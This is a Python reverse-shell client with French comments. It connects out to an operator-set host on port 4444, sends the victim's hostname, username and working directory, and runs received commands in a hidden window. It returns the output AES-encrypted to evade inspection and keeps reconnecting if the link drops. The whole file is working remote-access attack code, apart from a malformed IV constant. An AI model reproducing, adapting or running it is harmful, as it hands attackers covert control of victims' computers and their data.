import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- CONFIGURATION ---
# CHANGEZ CECI PAR VOTRE IP VRAIE
HOST = '192.168.1.10'  
PORT = 4444            

AES_KEY = b'CeciEstUneCle16!'  
AES_IV = b'VoiciUnIVDe16Octets' 

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception as e:
        print(f"[Encryption Error]: {e}")
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        print(f"[Decryption Error]: {e}")
        return None

def run_cmd(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    print("[+] Connection established. Sending initial info...")
    try:
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))
        print("[+] Initial info sent. Waiting for commands...")

        while True:
            s.settimeout(60.0) 
            try:
                encrypted_cmd = s.recv(4096).decode('utf-8')
                if not encrypted_cmd:
                    print("[-] Server closed connection.")
                    break
            except socket.timeout:
                try:
                    s.send(aes_encrypt("PING").encode('utf-8'))
                except:
                    print("[-] Heartbeat failed.")
                    break
                continue

            command = aes_decrypt(encrypted_cmd)
            if command is None:
                print("[-] Failed to decrypt command.")
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            if command == "PING":
                continue
            
            print(f"[+] Executing: {command}")
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))
            else:
                print("[-] Failed to encrypt output.")

    except Exception as e:
        print(f"[-] Connection Error: {e}")
    finally:
        try:
            s.close()
        except:
            pass

def main_loop():
    retry_count = 0
    print(f"[*] Starting client. Target: {HOST}:{PORT}")
    
    while True:
        try:
            print(f"[*] Attempting to connect... (Attempt {retry_count + 1})")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            s.connect((HOST, PORT))
            
            retry_count = 0
            handle_connection(s)
            
        except ConnectionRefusedError:
            print(f"[-] Connection Refused. Check if Listener is running on {HOST}:{PORT}.")
        except TimeoutError:
            print(f"[-] Connection Timed Out. Check firewall or IP.")
        except OSError as e:
            print(f"[-] Network Error: {e}")
        except Exception as e:
            print(f"[-] Unknown Error: {e}")

        retry_count += 1
        wait_time = min((retry_count * 2), 60)
        print(f"[*] Retrying in {wait_time} seconds...")
        time.sleep(wait_time)

if __name__ == "__main__":
    # On lance directement la boucle, sans thread pour voir les erreurs
    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit(0)